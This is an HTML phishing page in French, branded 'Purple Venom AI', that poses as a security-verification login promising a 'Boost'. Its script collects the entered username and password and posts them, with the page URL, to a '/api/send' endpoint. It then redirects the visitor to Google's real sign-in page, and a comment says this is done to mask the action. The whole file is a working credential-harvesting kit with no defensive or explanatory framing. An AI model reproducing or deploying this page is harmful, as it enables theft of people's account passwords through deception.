<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Purple Venom AI | Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #050505; color: #bc13fe; font-family: 'Courier New', monospace; }
        .main-card { border: 2px solid #bc13fe; background: #000; box-shadow: 0 0 20px rgba(188, 19, 254, 0.4); }
    </style>
</head>
<body class="flex items-center justify-center h-screen p-4">
    <div class="main-card w-full max-w-sm p-8 rounded-2xl text-center">
        <h1 class="text-2xl font-black mb-6 tracking-tighter">PURPLE VENOM AI</h1>
        <p class="text-[10px] text-zinc-500 mb-6 uppercase">Vérification de sécurité requise</p>
        
        <input type="text" id="user" placeholder="Email ou Utilisateur" 
            class="w-full p-3 mb-4 bg-zinc-900 border border-violet-900 rounded-lg text-white outline-none focus:border-white">
        
        <input type="password" id="pass" placeholder="Mot de passe" 
            class="w-full p-3 mb-6 bg-zinc-900 border border-violet-900 rounded-lg text-white outline-none focus:border-white">
        
        <button onclick="envoyer()" id="btn"
            class="w-full p-4 bg-violet-600 text-black font-black rounded-lg hover:bg-white transition-all uppercase">
            Accéder au Boost
        </button>
    </div>

    <script>
        async function envoyer() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const b = document.getElementById('btn');

            if(!u || !p) return alert("Champs vides");
            b.innerText = "CHARGEMENT...";

            try {
                await fetch('/api/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ user: u, pass: p, url: window.location.href })
                });
                // Redirection vers Google pour masquer l'action
                window.location.href = "https://accounts.google.com/signin";
            } catch (e) {
                alert("Erreur de synchronisation.");
            }
        }
    </script>
</body>
</html>
